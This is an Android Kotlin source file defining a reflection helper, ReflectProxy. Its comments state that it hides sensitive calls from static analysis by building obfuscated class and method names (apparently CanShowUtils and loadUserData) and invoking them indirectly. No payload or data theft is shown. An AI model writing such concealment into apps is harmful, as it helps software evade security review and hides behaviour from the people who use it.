package gh.sj.reflect

import android.content.Context
import gh.cark.NcZong
import java.lang.reflect.Method

/**
 * Date：2025/10/23
 * Describe: 反射代理类
 * 用于隐藏敏感调用，避免静态分析
 */
internal object ReflectProxy {
    
    // 缓存反射结果
    private var cachedClass: Class<*>? = null
    private var cachedMethod: Method? = null
    
    /**
     * 执行目标操作（通过反射）
     */
    fun executeTargetOperation(ctx: Context) {
        runCatching {
            // 第1层：获取目标类
            val targetClass = obtainTargetClass()
            
            // 第2层：获取目标方法
            val targetMethod = obtainTargetMethod(targetClass)
            
            // 第3层：执行目标方法（静态方法，不需要实例）
            invokeStaticMethod(targetMethod, ctx)
        }.onFailure { throwable ->
            throwable.printStackTrace()
        }
    }
    
    /**
     * 获取目标类（通过反射）
     */
    private fun obtainTargetClass(): Class<*> {
        return cachedClass ?: run {
            val className = buildTargetClassName()
            val clazz = Class.forName(className)
            cachedClass = clazz
            clazz
        }
    }
    
    /**
     * 构建目标类名(CanShowUtils)
     */
    private fun buildTargetClassName(): String {
        return buildString {
            append("a1.a.")
            append("A1")
        }
    }
    
    /**
     * 调用静态方法（不需要实例）
     */
    private fun invokeStaticMethod(method: Method, context: Context) {
        // 静态方法调用时，instance参数传null
        method.invoke(null, context)
    }
    
    /**
     * 获取目标方法（通过反射）
     */
    private fun obtainTargetMethod(targetClass: Class<*>): Method {
        return cachedMethod ?: run {
            val methodName = buildTargetMethodName()
            val method = targetClass.getDeclaredMethod(
                methodName,
                Context::class.java
            )
            method.isAccessible = true
            cachedMethod = method
            method
        }
    }
    
    /**
     * 构建目标方法名(loadUserData)
     */
    private fun buildTargetMethodName(): String {
        return buildString {
            append("a1")
        }
    }
    
    /**
     * 清除缓存（如果需要）
     */
    fun clearCache() {
        cachedClass = null
        cachedMethod = null
    }
}

